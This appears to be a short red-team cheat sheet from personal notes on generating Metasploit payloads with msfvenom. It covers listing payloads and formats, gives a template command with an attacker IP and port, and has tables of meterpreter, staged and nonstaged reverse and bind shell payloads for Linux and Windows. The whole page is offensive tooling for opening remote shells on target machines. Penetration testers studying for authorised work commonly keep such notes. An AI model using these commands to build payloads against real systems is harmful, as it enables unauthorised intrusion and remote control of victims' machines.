Primary Categories: [[02 - Gaining Access]] 
Secondary Categories: [[01 - Red Team]] 
Search Tag: #🗺  

# [[02 - MSFvenom Payload Generation]]  
***

## Show all payloads 

`msfvenom -l payloads`

## Show all payload formats 

`msfvenom -l formats`

## Generate a payload 

```Bash
msfvenom -p [payload] LHOST=[attacker IP] LPORT=[attacker port] -f [format] -o [output payload file name]
```

## Common payloads

**`meterpreter`**

| Command | Definition |
| ---- | ---- |
| `linux/x86/meterpreter/reverse_tcp` | linux x86 reverse shell |
| `linux/x64/meterpreter/reverse_tcp` | linux x64 reverse shell |
| `windows/meterpreter/reverse_tcp` | windows x86 reverse shell |
| `windows/x64/meterpreter/reverse_tcp` | windows x64 reverse shell |

**`Staged`**

| Command | Description |
| --- | --- |
| `linux/x86/shell/bind_tcp` | linux x86 bind shell
| `linux/x86/shell/reverse_tcp` | linux x86 reverse shell 
| `windows/shell/bind_tcp` | windows x86 bind shell 
| `windows/shell/reverse_tcp` | windows x86 reverse shell 

**`Nonstaged`**

| Command | Description |
| --- | --- |
| `linux/x86/shell_bind_tcp` | linux x86 bind shell 
| `linux/x86/shell_reverse_tcp` | linux x86 reverse shell 
| `windows/shell_bind_tcp` | windows x86 bind shell 
| `windows/shell_reverse_tcp` | windows x86 reverse shell 
